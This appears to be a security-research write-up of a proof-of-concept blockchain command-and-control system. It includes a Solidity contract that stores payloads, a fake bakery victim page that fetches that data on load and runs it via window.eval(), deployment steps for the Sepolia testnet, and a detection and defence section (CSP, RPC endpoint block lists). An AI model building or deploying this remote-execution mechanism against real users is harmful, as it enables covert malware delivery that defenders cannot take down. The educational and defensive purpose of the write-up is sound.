Overview

⚠️

Educational purpose only. This project is a proof-of-concept demonstration for security research and teaching. Unauthorised command and control systems are illegal. Do not deploy against real users or on Ethereum mainnet.

Traditional C2 infrastructure relies on servers that can be taken down, domains that can be sinkholed, and IP addresses that can be blocked. This proof-of-concept demonstrates how an attacker could instead use an Ethereum smart contract as the C2 channel — storing commands immutably on-chain where they cannot be removed by defenders.

The project consists of four components: a Solidity smart contract that stores arbitrary byte data, an attacker interface for uploading commands, a victim page that silently fetches and executes those commands, and a JavaScript application handling the blockchain interaction via ethers.js.

🔗

Source code available on GitHub. Full source including the smart contract, attacker interface, victim page, and app logic: github.com/Cupcakeatemytaser/Blockchain-C2-Demo ↗

Architecture

The system has three actors — the attacker, the blockchain, and the victim — with the smart contract acting as a permanent, decentralised middleman that neither the victim nor defenders can remove.

ATTACKER Writes malicious JavaScript to smart contract via setBytes()
↓ Ethereum transaction (Sepolia testnet)
BLOCKCHAIN Stores command immutably — no server to take down
↓ Public RPC call (anyone can read)
VICTIM Browser calls getBytes() and executes result via eval()
Traditional C2Blockchain C2
Server can be taken downSmart contract is permanent — immutable on-chain
Domain can be sinkholedNo domain — accessed via RPC endpoint
IP can be blockedDecentralised — multiple RPC providers available
Commands can be wipedCommands persist forever on the blockchain
Takedown disrupts all victimsNo single point of failure to disrupt
02

Attack Flow

  1. Attacker creates malicious JavaScript

    Any JavaScript that can run in a browser — credential theft, keylogging, cryptojacking, data exfiltration, session hijacking.

  2. Convert to hex and upload to the smart contract

    The attacker interface converts the payload to hex then calls setBytes(0x[hex]) via MetaMask. The transaction is signed and broadcast to Sepolia testnet.

  3. Command stored immutably on-chain

    Once confirmed (12+ seconds), the payload sits permanently in contract storage. Anyone with the contract address can read it — including victims.

  4. Victim visits the attacker's website

    The victim page looks innocent — a fake bakery called "Yummy Cakes". The malicious logic is embedded in the page's JavaScript, invisible to the user.

  5. Browser silently fetches the payload

    The embedded script connects to Sepolia RPC and calls contract.getBytes() — retrieving the stored payload without any user interaction.

  6. Payload decoded and executed

    The hex bytes are decoded back to a UTF-8 string and executed via window.eval() — running the attacker's code with full browser privileges.

victim.html — core attack logic JavaScript 
// Victim's browser automatically runs this on page load
const blob = await contract.getBytes();       // fetch from blockchain
window.eval(ethers.toUtf8String(blob));        // decode hex → execute

Project Components

.sol
blockChainC2.sol
Solidity smart contract deployed on Ethereum Sepolia testnet. Stores arbitrary byte data. Owner-only write access — only the attacker can call setBytes(). Public read access — any victim can call getBytes().
.html
AttackerInterface.html
Web-based attacker console. Converts ASCII payload to hex, connects to MetaMask for signing, and calls setBytes() to upload the command to the contract.
.html
victim.html
An innocent-looking fake bakery website ("Yummy Cakes") with embedded malicious JavaScript. On load, automatically connects to Sepolia RPC, fetches the stored payload, and executes it via window.eval().
.js
app.js
Module-based application logic using ethers.js. Handles MetaMask wallet connection, contract read/write operations, and ASCII to hexadecimal conversion.
04

Smart Contract

The contract is intentionally minimal — just enough to store and retrieve arbitrary byte data with owner-only write access.

blockChainC2.sol Solidity 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BlockchainC2 {
    address private owner;
    bytes private storedData;

    constructor() {
        owner = msg.sender;  // attacker is owner
    }

    // Only attacker can write commands
    function setBytes(bytes memory data) public {
        require(msg.sender == owner, "Not owner");
        storedData = data;
    }

    // Anyone (victims) can read commands
    function getBytes() public view returns (bytes memory) {
        return storedData;
    }

    // Get size of stored payload
    function getSize() public view returns (uint256) {
        return storedData.length;
    }
}

Deployment

⚠️

Sepolia testnet only. This demo uses Sepolia — Ethereum's test network. Sepolia ETH has no real value. Never deploy this on Ethereum mainnet where real ETH would be spent.

  1. Install MetaMask

    Install the MetaMask browser extension and create a wallet. Switch the network to Sepolia Testnet.

  2. Get free Sepolia ETH

    You need testnet ETH to pay gas fees for deploying the contract. Get it free from faucets — Alchemy Sepolia Faucet, Quicknode Faucet, or Chainlink Faucet (requires GitHub login).

  3. Deploy the smart contract

    Open remix.ethereum.org → paste blockChainC2.sol → compile → deploy with MetaMask on Sepolia. Note the deployed contract address.

  4. Update the contract address

    Replace 0x0000000000000000000000000000000000000000 in both AttackerInterface.html and victim.html with your deployed contract address.

  5. Upload a test payload via the attacker interface

    Open AttackerInterface.html → connect MetaMask → enter a harmless test payload e.g. console.log('C2 working') → convert to hex → call setBytes().

  6. Test the victim page

    Open victim.html in a browser. Open DevTools console — you should see the payload execute. If the test was console.log you'll see the output in the console.

Detection

Blockchain C2 is harder to detect than traditional C2 — but not undetectable. Several indicators can be monitored:

IndicatorWhat to look forWhere to look
Blockchain RPC connectionsOutbound connections to Infura, Alchemy, QuickNode, or public Ethereum RPC endpointsNetwork firewall logs, proxy logs
eval() of remote dataJavaScript executing dynamically fetched content via eval() or Function()Browser DevTools, EDR script monitoring
ethers.js or web3.js loadingPages loading blockchain libraries on non-Web3 sitesProxy / content inspection
Smart contract readsCalls to eth_call against unknown contract addressesNetwork traffic analysis
MetaMask promptsUnexpected signing prompts on non-financial sitesUser reports, endpoint monitoring
🔍

Public visibility is a weakness. Because all blockchain transactions are public, every command the attacker uploads is visible on Etherscan. This creates a permanent forensic record of the attack — a significant limitation compared to encrypted C2 channels.

07

Defence

  1. Content Security Policy (CSP)

    The most effective defence. Add script-src 'self' to your CSP header — this blocks eval() execution entirely, breaking the C2 execution chain at the final step.

  2. Block blockchain RPC endpoints at the network level

    Block or alert on connections to known Ethereum RPC providers: mainnet.infura.io, *.alchemyapi.io, *.quiknode.pro, rpc.sepolia.org and similar.

  3. Monitor for eval() of dynamic content

    EDR solutions and browser security products can detect and alert on eval() called with data fetched from remote sources — a common malware pattern beyond just blockchain C2.

  4. Web Application Firewall rules

    WAF rules can inspect JavaScript responses and block pages loading ethers.js or web3.js from CDNs on non-approved sites.

  5. User education

    Train users to be suspicious of unexpected MetaMask signing prompts — these appear on the victim's browser when the attacker interface loads, providing a detectable signal.

CSP header — blocks eval() execution HTTP Header 
Content-Security-Policy: script-src 'self'; object-src 'none'
